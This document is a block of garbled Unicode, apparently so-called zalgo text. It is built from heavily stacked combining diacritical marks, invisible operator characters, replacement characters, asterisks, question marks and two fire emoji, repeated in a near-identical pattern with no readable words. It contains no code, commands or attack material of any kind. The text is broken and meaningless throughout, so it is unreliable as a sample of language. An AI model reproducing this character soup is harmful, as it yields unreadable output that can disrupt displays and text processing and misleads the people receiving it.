̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̅̍̏͟͟⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͌͒̒̽͜